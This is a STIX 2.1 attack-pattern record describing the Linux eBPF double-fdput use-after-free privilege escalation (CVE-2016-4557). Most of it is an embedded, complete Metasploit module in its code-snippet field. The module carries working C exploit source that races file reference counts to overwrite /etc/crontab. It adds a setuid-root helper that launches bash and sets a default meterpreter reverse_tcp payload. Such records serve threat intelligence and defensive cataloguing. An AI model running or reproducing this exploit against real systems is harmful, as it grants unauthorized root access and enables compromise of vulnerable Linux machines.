{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--80d8d8f2-3ae1-48fc-bc95-fd81c811cc9f",
    "created": "2024-08-14T16:58:36.765655Z",
    "modified": "2024-08-14T16:58:36.765659Z",
    "name": "Linux BPF doubleput UAF Privilege Escalation",
    "description": " Linux kernel 4.4 < 4.5.5 extended Berkeley Packet Filter (eBPF) does not properly reference count file descriptors, resulting in a use-after-free, which can be abused to escalate privileges.  The target system must be compiled with `CONFIG_BPF_SYSCALL` and must not have `kernel.unprivileged_bpf_disabled` set to 1.  Note, this module will overwrite the first few lines of `/etc/crontab` with a new cron job. The job will need to be manually removed.  This module has been tested successfully on Ubuntu 16.04 (x64) kernel 4.4.0-21-generic (default kernel).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/bpf_priv_esc.rb",
            "external_id": "bpf_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4557"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=808"
        },
        {
            "source_name": "reference",
            "url": "https://usn.ubuntu.com/2965-1/"
        },
        {
            "source_name": "reference",
            "url": "https://launchpad.net/bugs/1578705"
        },
        {
            "source_name": "reference",
            "url": "http://changelogs.ubuntu.com/changelogs/pool/main/l/linux/linux_4.4.0-22.39/changelog"
        },
        {
            "source_name": "reference",
            "url": "https://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-4557.html"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux BPF doubleput UAF Privilege Escalation',\n        'Description' => %q{\n          Linux kernel 4.4 < 4.5.5 extended Berkeley Packet Filter (eBPF)\n          does not properly reference count file descriptors, resulting\n          in a use-after-free, which can be abused to escalate privileges.\n\n          The target system must be compiled with `CONFIG_BPF_SYSCALL`\n          and must not have `kernel.unprivileged_bpf_disabled` set to 1.\n\n          Note, this module will overwrite the first few lines\n          of `/etc/crontab` with a new cron job. The job will\n          need to be manually removed.\n\n          This module has been tested successfully on Ubuntu 16.04 (x64)\n          kernel 4.4.0-21-generic (default kernel).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'jannh@google.com', # discovery and exploit\n          'h00die <mike@shorebreaksecurity.com>' # metasploit module\n        ],\n        'Platform' => ['linux'],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'DisclosureDate' => '2016-05-04',\n        'Privileged' => true,\n        'References' => [\n          ['BID', '90309'],\n          ['CVE', '2016-4557'],\n          ['EDB', '39772'],\n          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=808'],\n          ['URL', 'https://usn.ubuntu.com/2965-1/'],\n          ['URL', 'https://launchpad.net/bugs/1578705'],\n          ['URL', 'http://changelogs.ubuntu.com/changelogs/pool/main/l/linux/linux_4.4.0-22.39/changelog'],\n          ['URL', 'https://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-4557.html'],\n          ['URL', 'https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7']\n        ],\n        'Targets' => [\n          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'PrependFork' => true,\n          'WfsDelay' => 60 # we can chew up a lot of CPU for this, so we want to give time for payload to come through\n        },\n        'Notes' => {\n          'AKA' =>\n                   [\n                     'double-fdput',\n                     'doubleput.c'\n                   ]\n        },\n        'DefaultTarget' => 1,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n    register_options [\n      OptEnum.new('COMPILE', [true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']]),\n      OptInt.new('MAXWAIT', [true, 'Max time to wait for decrementation in seconds', 120])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def exploit_data(file)\n    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2016-4557', file)\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def live_compile?\n    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')\n\n    return true if has_prereqs?\n\n    unless datastore['COMPILE'].eql? 'Auto'\n      fail_with Failure::BadConfig, 'Prerequisites are not installed. Compiling will fail.'\n    end\n  end\n\n  def has_prereqs?\n    def check_libfuse_dev?\n      lib = cmd_exec('dpkg --get-selections | grep libfuse-dev')\n      if lib.include?('install')\n        vprint_good('libfuse-dev is installed')\n        return true\n      else\n        print_error('libfuse-dev is not installed.  Compiling will fail.')\n        return false\n      end\n    end\n\n    def check_gcc?\n      if has_gcc?\n        vprint_good('gcc is installed')\n        return true\n      else\n        print_error('gcc is not installed.  Compiling will fail.')\n        return false\n      end\n    end\n\n    def check_pkgconfig?\n      lib = cmd_exec('dpkg --get-selections | grep ^pkg-config')\n      if lib.include?('install')\n        vprint_good('pkg-config is installed')\n        return true\n      else\n        print_error('pkg-config is not installed.  Exploitation will fail.')\n        return false\n      end\n    end\n\n    return check_libfuse_dev? && check_gcc? && check_pkgconfig?\n  end\n\n  def upload_and_compile(path, data, gcc_args = '')\n    upload \"#{path}.c\", data\n\n    gcc_cmd = \"gcc -o #{path} #{path}.c\"\n    if session.type.eql? 'shell'\n      gcc_cmd = \"PATH=$PATH:/usr/bin/ #{gcc_cmd}\"\n    end\n\n    unless gcc_args.to_s.blank?\n      gcc_cmd << \" #{gcc_args}\"\n    end\n\n    output = cmd_exec gcc_cmd\n\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile. Set COMPILE False to upload a pre-compiled executable.\"\n    end\n\n    register_file_for_cleanup path\n    chmod path\n  end\n\n  def check\n    release = kernel_release\n    version = kernel_version\n\n    if Rex::Version.new(release.split('-').first) < Rex::Version.new('4.4') ||\n       Rex::Version.new(release.split('-').first) > Rex::Version.new('4.5.5')\n      vprint_error \"Kernel version #{release} #{version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n\n    if version.downcase.include?('ubuntu') && release =~ /^4\\.4\\.0-(\\d+)-/\n      if $1.to_i > 21\n        vprint_error \"Kernel version #{release} is not vulnerable\"\n        return CheckCode::Safe\n      end\n    end\n    vprint_good \"Kernel version #{release} #{version} appears to be vulnerable\"\n\n    lib = cmd_exec('dpkg --get-selections | grep ^fuse').to_s\n    unless lib.include?('install')\n      print_error('fuse package is not installed.  Exploitation will fail.')\n      return CheckCode::Safe\n    end\n    vprint_good('fuse package is installed')\n\n    fuse_mount = \"#{base_dir}/fuse_mount\"\n    if directory? fuse_mount\n      vprint_error(\"#{fuse_mount} should be unmounted and deleted.  Exploitation will fail.\")\n      return CheckCode::Safe\n    end\n    vprint_good(\"#{fuse_mount} doesn't exist\")\n\n    config = kernel_config\n\n    if config.nil?\n      vprint_error 'Could not retrieve kernel config'\n      return CheckCode::Unknown\n    end\n\n    unless config.include? 'CONFIG_BPF_SYSCALL=y'\n      vprint_error 'Kernel config does not include CONFIG_BPF_SYSCALL'\n      return CheckCode::Safe\n    end\n    vprint_good 'Kernel config has CONFIG_BPF_SYSCALL enabled'\n\n    if unprivileged_bpf_disabled?\n      vprint_error 'Unprivileged BPF loading is not permitted'\n      return CheckCode::Safe\n    end\n    vprint_good 'Unprivileged BPF loading is permitted'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    if nosuid? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is mounted nosuid\"\n    end\n\n    doubleput = %q{\n      #define _GNU_SOURCE\n      #include <stdbool.h>\n      #include <errno.h>\n      #include <err.h>\n      #include <unistd.h>\n      #include <fcntl.h>\n      #include <sched.h>\n      #include <signal.h>\n      #include <stdlib.h>\n      #include <stdio.h>\n      #include <string.h>\n      #include <sys/types.h>\n      #include <sys/stat.h>\n      #include <sys/syscall.h>\n      #include <sys/prctl.h>\n      #include <sys/uio.h>\n      #include <sys/mman.h>\n      #include <sys/wait.h>\n      #include <linux/bpf.h>\n      #include <linux/kcmp.h>\n\n      #ifndef __NR_bpf\n      # if defined(__i386__)\n      #  define __NR_bpf 357\n      # elif defined(__x86_64__)\n      #  define __NR_bpf 321\n      # elif defined(__aarch64__)\n      #  define __NR_bpf 280\n      # else\n      #  error\n      # endif\n      #endif\n\n      int uaf_fd;\n\n      int task_b(void *p) {\n        /* step 2: start writev with slow IOV, raising the refcount to 2 */\n        char *cwd = get_current_dir_name();\n        char data[2048];\n        sprintf(data, \"* * * * * root /bin/chown root:root '%s'/suidhelper; /bin/chmod 06755 '%s'/suidhelper\\n#\", cwd, cwd);\n        struct iovec iov = { .iov_base = data, .iov_len = strlen(data) };\n        if (system(\"fusermount -u /home/user/ebpf_mapfd_doubleput/fuse_mount 2>/dev/null; mkdir -p fuse_mount && ./hello ./fuse_mount\"))\n          errx(1, \"system() failed\");\n        int fuse_fd = open(\"fuse_mount/hello\", O_RDWR);\n        if (fuse_fd == -1)\n          err(1, \"unable to open FUSE fd\");\n        if (write(fuse_fd, &iov, sizeof(iov)) != sizeof(iov))\n          errx(1, \"unable to write to FUSE fd\");\n        struct iovec *iov_ = mmap(NULL, sizeof(iov), PROT_READ, MAP_SHARED, fuse_fd, 0);\n        if (iov_ == MAP_FAILED)\n          err(1, \"unable to mmap FUSE fd\");\n        fputs(\"starting writev\\n\", stderr);\n        ssize_t writev_res = writev(uaf_fd, iov_, 1);\n        /* ... and starting inside the previous line, also step 6: continue writev with slow IOV */\n        if (writev_res == -1)\n          err(1, \"writev failed\");\n        if (writev_res != strlen(data))\n          errx(1, \"writev returned %d\", (int)writev_res);\n        fputs(\"writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.\\n\", stderr);\n        while (1) sleep(1); /* whatever, just don't crash */\n      }\n\n      void make_setuid(void) {\n        /* step 1: open writable UAF fd */\n        uaf_fd = open(\"/dev/null\", O_WRONLY|O_CLOEXEC);\n        if (uaf_fd == -1)\n          err(1, \"unable to open UAF fd\");\n        /* refcount is now 1 */\n\n        char child_stack[20000];\n        int child = clone(task_b, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);\n        if (child == -1)\n          err(1, \"clone\");\n        sleep(3);\n        /* refcount is now 2 */\n\n        /* step 2+3: use BPF to remove two references */\n        for (int i=0; i<2; i++) {\n          struct bpf_insn insns[2] = {\n            {\n              .code = BPF_LD | BPF_IMM | BPF_DW,\n              .src_reg = BPF_PSEUDO_MAP_FD,\n              .imm = uaf_fd\n            },\n            {\n            }\n          };\n          union bpf_attr attr = {\n            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,\n            .insn_cnt = 2,\n            .insns = (__aligned_u64) insns,\n            .license = (__aligned_u64)\"\"\n          };\n          if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)\n            errx(1, \"expected BPF_PROG_LOAD to fail, but it didn't\");\n          if (errno != EINVAL)\n            err(1, \"expected BPF_PROG_LOAD to fail with -EINVAL, got different error\");\n        }\n        /* refcount is now 0, the file is freed soon-ish */\n\n        /* step 5: open a bunch of readonly file descriptors to the target file until we hit the same pointer */\n        int status;\n        int hostnamefds[1000];\n        int used_fds = 0;\n        bool up = true;\n        while (1) {\n          if (waitpid(child, &status, WNOHANG) == child)\n            errx(1, \"child quit before we got a good file*\");\n          if (up) {\n            hostnamefds[used_fds] = open(\"/etc/crontab\", O_RDONLY);\n            if (hostnamefds[used_fds] == -1)\n              err(1, \"open target file\");\n            if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, hostnamefds[used_fds]) == 0) break;\n            used_fds++;\n            if (used_fds == 1000) up = false;\n          } else {\n            close(hostnamefds[--used_fds]);\n            if (used_fds == 0) up = true;\n          }\n        }\n        fputs(\"woohoo, got pointer reuse\\n\", stderr);\n        while (1) sleep(1); /* whatever, just don't crash */\n      }\n\n      int main(void) {\n        pid_t child = fork();\n        if (child == -1)\n          err(1, \"fork\");\n        if (child == 0)\n          make_setuid();\n        struct stat helperstat;\n        while (1) {\n          if (stat(\"suidhelper\", &helperstat))\n            err(1, \"stat suidhelper\");\n          if (helperstat.st_mode & S_ISUID)\n            break;\n          sleep(1);\n        }\n        fputs(\"suid file detected, launching rootshell...\\n\", stderr);\n        execl(\"./suidhelper\", \"suidhelper\", NULL);\n        err(1, \"execl suidhelper\");\n      }\n    }\n\n    suid_helper = %q{\n      #include <unistd.h>\n      #include <err.h>\n      #include <stdio.h>\n      #include <sys/types.h>\n\n      int main(void) {\n        if (setuid(0) || setgid(0))\n          err(1, \"setuid/setgid\");\n        fputs(\"we have root privs now...\\n\", stderr);\n        execl(\"/bin/bash\", \"bash\", NULL);\n        err(1, \"execl\");\n      }\n\n    }\n\n    hello = %q{\n      /*\n        FUSE: Filesystem in Userspace\n        Copyright (C) 2001-2007  Miklos Szeredi <miklos@szeredi.hu>\n        heavily modified by Jann Horn <jannh@google.com>\n\n        This program can be distributed under the terms of the GNU GPL.\n        See the file COPYING.\n\n        gcc -Wall hello.c `pkg-config fuse --cflags --libs` -o hello\n      */\n\n      #define FUSE_USE_VERSION 26\n\n      #include <fuse.h>\n      #include <stdio.h>\n      #include <string.h>\n      #include <errno.h>\n      #include <fcntl.h>\n      #include <unistd.h>\n      #include <err.h>\n      #include <sys/uio.h>\n\n      static const char *hello_path = \"/hello\";\n\n      static char data_state[sizeof(struct iovec)];\n\n      static int hello_getattr(const char *path, struct stat *stbuf)\n      {\n        int res = 0;\n        memset(stbuf, 0, sizeof(struct stat));\n        if (strcmp(path, \"/\") == 0) {\n          stbuf->st_mode = S_IFDIR | 0755;\n          stbuf->st_nlink = 2;\n        } else if (strcmp(path, hello_path) == 0) {\n          stbuf->st_mode = S_IFREG | 0666;\n          stbuf->st_nlink = 1;\n          stbuf->st_size = sizeof(data_state);\n          stbuf->st_blocks = 0;\n        } else\n          res = -ENOENT;\n        return res;\n      }\n\n      static int hello_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {\n        filler(buf, \".\", NULL, 0);\n        filler(buf, \"..\", NULL, 0);\n        filler(buf, hello_path + 1, NULL, 0);\n        return 0;\n      }\n\n      static int hello_open(const char *path, struct fuse_file_info *fi) {\n        return 0;\n      }\n\n      static int hello_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {\n        sleep(10);\n        size_t len = sizeof(data_state);\n        if (offset < len) {\n          if (offset + size > len)\n            size = len - offset;\n          memcpy(buf, data_state + offset, size);\n        } else\n          size = 0;\n        return size;\n      }\n\n      static int hello_write(const char *path, const char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {\n        if (offset != 0)\n          errx(1, \"got write with nonzero offset\");\n        if (size != sizeof(data_state))\n          errx(1, \"got write with size %d\", (int)size);\n        memcpy(data_state + offset, buf, size);\n        return size;\n      }\n\n      static struct fuse_operations hello_oper = {\n        .getattr\t= hello_getattr,\n        .readdir\t= hello_readdir,\n        .open\t\t= hello_open,\n        .read\t\t= hello_read,\n        .write\t\t= hello_write,\n      };\n\n      int main(int argc, char *argv[]) {\n        return fuse_main(argc, argv, &hello_oper, NULL);\n      }\n    }\n\n    @hello_name = 'hello'\n    hello_path = \"#{base_dir}/#{@hello_name}\"\n    @doubleput_name = 'doubleput'\n    doubleput_path = \"#{base_dir}/#{@doubleput_name}\"\n    @suidhelper_path = \"#{base_dir}/suidhelper\"\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(10..15)}\"\n\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n\n      upload_and_compile(hello_path, hello, '-Wall -std=gnu99 `pkg-config fuse --cflags --libs`')\n      upload_and_compile(doubleput_path, doubleput, '-Wall')\n      upload_and_compile(@suidhelper_path, suid_helper, '-Wall')\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n\n      upload_and_chmodx(hello_path, exploit_data('hello'))\n      upload_and_chmodx(doubleput_path, exploit_data('doubleput'))\n      upload_and_chmodx(@suidhelper_path, exploit_data('suidhelper'))\n    end\n\n    vprint_status 'Uploading payload...'\n    upload_and_chmodx(payload_path, generate_payload_exe)\n\n    print_status('Launching exploit. This may take up to 120 seconds.')\n    print_warning('This module adds a job to /etc/crontab which requires manual removal!')\n\n    register_dir_for_cleanup \"#{base_dir}/fuse_mount\"\n    cmd_exec \"cd #{base_dir}; #{doubleput_path} & echo \"\n    sec_waited = 0\n    until sec_waited > datastore['MAXWAIT'] do\n      Rex.sleep(5)\n      # check file permissions\n      if setuid? @suidhelper_path\n        print_good(\"Success! set-uid root #{@suidhelper_path}\")\n        cmd_exec \"echo '#{payload_path} & exit' | #{@suidhelper_path} \"\n        return\n      end\n      sec_waited += 5\n    end\n    print_error \"Failed to set-uid root #{@suidhelper_path}\"\n  end\n\n  def cleanup\n    cmd_exec \"killall #{@hello_name}\"\n    cmd_exec \"killall #{@doubleput_name}\"\n  ensure\n    super\n  end\n\n  def on_new_session(session)\n    # remove root owned SUID executable and kill running exploit processes\n    if session.type.eql? 'meterpreter'\n      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n      session.fs.file.rm @suidhelper_path\n      session.sys.process.execute '/bin/sh', \"-c 'killall #{@doubleput_name}'\"\n      session.sys.process.execute '/bin/sh', \"-c 'killall #{@hello_name}'\"\n      session.fs.file.rm \"#{base_dir}/fuse_mount\"\n    else\n      session.shell_command_token \"rm -f '#{@suidhelper_path}'\"\n      session.shell_command_token \"killall #{@doubleput_name}\"\n      session.shell_command_token \"killall #{@hello_name}\"\n      session.shell_command_token \"rm -f '#{base_dir}/fuse_mount'\"\n    end\n  ensure\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-05-04",
    "x_mitre_platforms": [
        "['linux']"
    ]
}